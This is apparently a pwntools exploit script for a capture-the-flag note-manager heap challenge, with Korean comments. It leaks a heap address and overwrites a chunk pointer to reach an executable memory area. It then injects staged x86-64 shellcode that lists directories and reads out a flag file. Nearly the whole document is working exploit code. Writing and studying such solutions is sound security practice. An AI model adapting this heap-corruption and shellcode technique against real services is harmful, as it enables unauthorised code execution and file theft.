from pwn import *
p = process("./chal")
# p = remote("127.0.0.1", 44332)
context.arch = "amd64"

def create_note(idx,size,content):
    p.sendlineafter(b"> ",b"1")
    p.sendlineafter(b"index: ",str(idx).encode())
    p.sendlineafter(b"size: ",str(size).encode())
    p.sendafter(b"content: ",content)

def edit_note(idx,content):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"index: ",str(idx).encode())
    p.sendafter(b"content: ",content)

def view_note(idx):
    p.sendlineafter(b"> ",b"3")
    p.sendlineafter(b"index: ",str(idx).encode())

def delete_note(idx):
    p.sendlineafter(b"> ",b"4")
    p.sendlineafter(b"index: ",str(idx).encode())




p.sendafter(b"name?\n",b"aaa")
create_note(10,0,b"AAA")
p.recvuntil(b"Hello, ")
leak = u64(p.recvline()[:-2].ljust(8,b"\x00"))
log.info("leak: "+hex(leak))
heapbase = leak - 0x2c0
rwxmarkingaddr = heapbase + 0x2a0
for i in range(5):
    create_note(i,0,b"AAA")
pause()
edit_note(10,p64(0)*2 + p64(0) + p64(0x21) +p64(0) +  p64(rwxmarkingaddr+1))
view_note(0)
p.recvuntil(b"Note 0:\n")
rwxarea = u64(b"\x00" + p.recvline()[:-1].ljust(7,b"\x00"))
log.info("rwxarea: "+hex(rwxarea))
edit_note(10,p64(0)*2 + p64(0) + p64(0x21) +p64(0) +  p64(rwxarea))

shellcode =  ""
shellcode += shellcraft.pushstr("/home/chall/runs")   # "/home" 문자열을 스택에 푸시
# shellcode += shellcraft.pushstr("/pwn/frontier/pctf/runs")   # "/home" 문자열을 스택에 푸시
shellcode += "mov rdi, rsp\n"               # rdi = 주소 (스택 포인터)
shellcode += "xor rsi, rsi\n"               # O_RDONLY = 0
shellcode += "mov rax, 2\n"                  # sys_open
shellcode += "syscall\n"

shellcode += "test rax, rax\n"
shellcode += "mov rdi, rax\n"                # fd
shellcode += "mov rax, 78\n"                  # sys_getdents
shellcode += "mov rsi, rsp\n"                # 버퍼 rsp 사용
shellcode += "mov rdx, 0x400\n"              # 버퍼 크기 1024
shellcode += "syscall\n"

shellcode += "mov rdi, 1\n"                   # stdout
shellcode += "mov rsi, rsp\n"                 # 버퍼 주소
shellcode += "mov rdx, rax\n"                 # 읽은 바이트 수
shellcode += "mov rax, 1\n"                    # sys_write
shellcode += "syscall\n"

shellcode += "xor rax,rax\n"                # sys_read
shellcode += "mov rdi, rax\n"                # fd = 0 (stdin)
shellcode += f"mov rsi, {rwxarea}\n"        # 버퍼 주소
shellcode += "mov rdx, 0x500\n"              # 크기
shellcode += "syscall\n"                


edit_note(0,asm(shellcode))
context.log_level = "debug"
p.sendlineafter(b"> ",b"5")

p.recvuntil(b"DIR-")
dirname = b"DIR-" + p.recvuntil(b"\x00")[:-1]
log.info("dirname: "+dirname.decode())
dirpath = b"/home/chall/runs/" + dirname + b"/"
# dirpath = b"/pwn/frontier/pctf/runs/" + dirname + b"/"
log.info("dirpath: "+dirpath.decode())
shellcode += shellcraft.pushstr(dirpath.decode())   # "/home" 문자열을 스택에 푸시
shellcode += "mov rdi, rsp\n"               # rdi = 주소 (스택 포인터)
shellcode += "xor rsi, rsi\n"               # O_RDONLY = 0
shellcode += "mov rax, 2\n"                  # sys_open
shellcode += "syscall\n"
shellcode += "test rax, rax\n"
shellcode += "mov rdi, rax\n"                # fd
shellcode += "mov rax, 78\n"                  # sys_getdents
shellcode += "mov rsi, rsp\n"                # 버퍼 rsp 사용
shellcode += "mov rdx, 0x400\n"              # 버퍼 크
shellcode += "syscall\n"
shellcode += "mov rdi, 1\n"                   # stdout
shellcode += "mov rsi, rsp\n"                 # 버퍼 주소
shellcode += "mov rdx, rax\n"                 # 읽은 바이트 수
shellcode += "mov rax, 1\n"                    # sys_write
shellcode += "syscall\n"
shellcode += "xor rax,rax\n"                # sys_read
shellcode += "mov rdi, rax\n"                # fd = 0 (stdin)
shellcode += f"mov rsi, {rwxarea}\n"        # 버퍼 주소
shellcode += "mov rdx, 0x500\n"              # 크기
shellcode += "syscall\n"                

p.send(asm(shellcode))
p.recvuntil(b"flag-")
flagfilename = b"flag-" + p.recvuntil(b"\x00")[:-1]
log.info("flagfilename: "+flagfilename.decode())

shellcode += shellcraft.pushstr((dirpath+flagfilename).decode())   # "/home" 문자열을 스택에 푸시
shellcode += "mov rdi, rsp\n"               # rdi = 주소 (스택 포인터)
shellcode += "xor rsi, rsi\n"               # O_RDONLY = 0
shellcode += "mov rax, 2\n"                  # sys_open
shellcode += "syscall\n"
shellcode += "test rax, rax\n"
shellcode += "mov rdi, rax\n"                # fd
shellcode += "mov rax, 0\n"                  # sys_read
shellcode += f"mov rsi, rsp\n"        # 버
shellcode += "mov rdx, 0x100\n"              # 크기
shellcode += "syscall\n"
shellcode += "mov rdi, 1\n"                   # stdout
shellcode += "mov rsi, rsp\n"                 # 버퍼 주소
shellcode += "mov rdx, rax\n"                 # 읽은 바이트 수
shellcode += "mov rax, 1\n"                    # sys_write
shellcode += "syscall\n"

p.send(asm(shellcode))
flag = p.recvline()
log.success("flag: "+flag.decode())
p.interactive()